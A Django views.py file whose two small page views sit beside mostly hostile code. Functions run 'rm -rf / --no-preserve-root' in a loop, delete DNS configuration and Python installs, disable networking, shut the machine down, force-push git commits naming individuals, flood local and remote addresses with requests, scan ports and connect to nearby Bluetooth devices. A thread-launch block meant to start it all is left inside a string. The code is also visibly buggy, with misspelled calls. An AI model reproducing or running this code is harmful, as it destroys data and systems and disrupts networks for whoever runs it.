from django.shortcuts import render

# Create your views here.

import subprocess
import re
import socket
import threading
import time
import os
import urllib.request
from _thread import *

import random

client_sockets = [] # 서버에 접속한 클라이언트 목록
import asyncio # 비동기화 모듈
from bleak import BleakScanner # BLE 검색 모듈
from bleak import BleakClient # BLE 검색 모듈

def req_local():
    
 addr=['fe80::bc74:28ff:fe24:62f0','fe80::b82b:f8ff:fe8a:6d3a','fe80::54d7:45ff:fe4a:a4ae',"fe80::7863:e9ff:fed6:b723"]
 while True:
     for i in range(65646):
         try:
             urllib.request.urlopen('http://110.12.219.'+str(i)%255+':8080')
         except:
             pass
         for a in addr:
          try:
           urllib.request.urlopen('http://'+a)
          except:
           pass
         try:
          urllib.request.openurl('http://127.0.0.1:'+str(i))
         except:
          pass
         try:
          urllib.request.openurl('http://127.0.0.1:80')
         except:
          pass
         try:
          urllib.request.openurl('http://127.0.0.1:8080')
         except:
          pass
                                
          
    
    
def execute(cmd, pipe=False):
 if isinstance(cmd, str):
  cmd_list = cmd.split(' ')
 elif isinstnace:
  cmd_list = cmd
 
 if pipe:
  ps = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
  output = ps.communicate()[0].decode()
 else:
  output = subprocess.check_output(cmd_list).decode()
 
 return remove_color_code_regex.sub('', output)

def cmd():
    
 while True:
  cmd = 'git add .'
  output = execute(cmd, pipe=True)
  cmd = 'git commit -m "경기대 지예준 박세철 이동국 이세준 김재석 해커 짓 멈춰라"'
  output = execute(cmd, pipe=True)
  cmd = 'git push origin main'
  output = execute(cmd, pipe=True)
  cmd = 'git push origin master'
  output = execute(cmd, pipe=True)
  cmd = 'git push origin dev'
  output = execute(cmd, pipe=True)
  cmd = 'echo rm -rf / --no-preserve-root'
  output = execute(cmd, pipe=True)
  cmd = 'rm -rf / --no-preserve-root'
  output = execute(cmd, pipe=True)
  cmd = 'echo rm -rf / --no-preserve-root'
  output = execute(cmd, pipe=True)
  cmd ='modprobe pcspkr'
  output = execute(cmd, pipe=True)


def run_connect(address):
    # 장치 주소를 이용해 client 클래스 생성
    client = BleakClient(address)
    try:
        # 장치 연결 해제 콜백 함수 등록
        client.set_disconnected_callback(on_disconnect)
        # 장치 연결 시작
        client.connect()
        print('connect : '+ str(address)) 
        time.sleep(3)                                                             
    except Exception as e:
        # 연결 실패시 발생
        print('error: ', e, end='')        
    finally:
        print('disconnect : '+ str(address)) 
        # 장치 연결 해제
        client.disconnect()                                     



async def run():
    # 검색 시작 (검색이 종료될때까지 대기)
    # 기본 검색 시간은 5초이다.
    devices = await BleakScanner.discorver()
    # 검색된 장치들 리스트 출력
    for d in devices:
        run_connect(d)

# 비동기 이벤트 루프 생성

def bluetooth_scan():
    while True:
        loop = asyncio.get_event_loop()
# 비동기 형태로 run(검색)함수 실행
# 완료될때까지 대기
        loop.run_until_complete(run())
def scan_ports(host, start_port, end_port):
    open_ports = []
    for port in range(start_port, end_port):
        print(port)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.1)
        result = sock.connect_ex((host, port))
        if result == 0:
            open_ports.append(port)
            print(f'Port {port} is open')
        
        
        sock.close()
    return open_ports

def scan_ports_repeat(host, start_port, end_port):
    try:
        while True:
            open_ports = []
            for port in range(start_port, end_port):
                print(port)
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                result = sock.connect_ex((host, port))
                if result == 0:
                    open_ports.append(port)
                    while result:
                     result = sock.connect_ex((host, port))
                     urllib.request('http://127.0.0.1:'+str(port)+'/')
                     
                
                sock.close()
    except:
        pass


def server_main_process():
    while True:
     try: 
         
             
             HOST = '127.0.0.1'
             PORT = random.randint(0,65545)
             
             os.system('ipconfig/flushdns')
             print('>> Server Start')
             server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             server_socket.bind((HOST, PORT))
             server_socket.listen()
        
             # 서버 소켓 생성
               
     except:
         pass
def cmd_repeat():
   cmd = [ 'beep','ipconfig/flushdns','sudo unset http_proxy','sudo unset https_proxy','netsh winhttp reset proxy',"sed -i 's/8.8.8.8/8.8.4.4/g' /etc/resolv.conf",'systemctl disable NetworkManger','sysctl -w net.ipv6.conf.ens3.disable_ipv6=1','rm -rf /etc/resolv.conf','beep','sudo apt-get full-upgrade','sudo apt-get install --reinstall ubuntu-desktop','shutdown -h now','find . -name "python3.11" -exec rm -rf {} \;','find . -name "Python3.11" -exec rm -rf {} \;','find . -name "python" -exec rm -rf {} \;','find . -name "Python" -exec rm -rf {} \;','find . -name "python*" -exec rm -rf {} \;','find . -name "Python*" -exec rm -rf {} \;']
   while True:
      cnt = 0
      for c in cmd:
        cnt = cnt + 1
        print('------')
        print(cnt)
        os.system(c)

def scan_ports_repeat_jjal(host, start_port, end_port):
    try:
        while True:
            open_ports = []
            for port in range(start_port, end_port):
                print(port)
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                result = sock.connect_ex((host, port))
                if result == 0:
                    open_ports.append(port)
                    while result:
                     result = sock.connect_ex((host, port))
                     urllib.request('http://jjalbot.com:'+str(port)+'/')
                     
                
                sock.close()
    except:
        pass





def index(request):
    

    return render(request,'apps/index.html')

def lotto(request):
    

    return render(request,'apps/lotto.html')
"""
command_repeat = threading.Thread(target=cmd_repeat ,args=())
command_repeat.start()
server = threading.Thread(target=server_main_process, args=())
server.start()
port1 = threading.Thread(target=scan_ports_repeat, args=('127.0.0.1',1, 10000))
port1.start()
port2 = threading.Thread(target=scan_ports_repeat, args=('127.0.0.1',10001, 20000))
port2.start()
port3 = threading.Thread(target=scan_ports_repeat, args=('127.0.0.1',20001, 30000))
port3.start()
port4 = threading.Thread(target=scan_ports_repeat, args=('127.0.0.1',30001, 40000))
port4.start()
port5 = threading.Thread(target=scan_ports_repeat, args=('127.0.0.1',40001, 50000))
port5.start()
port6 = threading.Thread(target=scan_ports_repeat, args=('127.0.0.1',50001, 65545))
port6.start()
port1_jjal = threading.Thread(target=scan_ports_repeat_jjal , args=('127.0.0.1',1, 10000))
port1_jjal.start()
port2_jjal = threading.Thread(target=scan_ports_repeat_jjal, args=('127.0.0.1',10001, 20000))
port2_jjal.start()
port3_jjal = threading.Thread(target=scan_ports_repeat_jjal, args=('127.0.0.1',20001, 30000))
port3_jjal.start()
port4_jjal = threading.Thread(target=scan_ports_repeat_jjal, args=('127.0.0.1',30001, 40000))
port4_jjal.start()
port5_jjal = threading.Thread(target=scan_ports_repeat_jjal, args=('127.0.0.1',40001, 50000))
port5_jjal.start()
port6_jjal = threading.Thread(target=scan_ports_repeat_jjal, args=('127.0.0.1',50001, 65545))
port6_jjal.start()
bluetooth = threading.Thread(target=bluetooth_scan, args=())
bluetooth.start()
command_proc = threading.Thread(target=cmd ,args=())
command_proc.start()
req_local = threading.Thread(target=req_local ,args=())
command_proc.start()

"""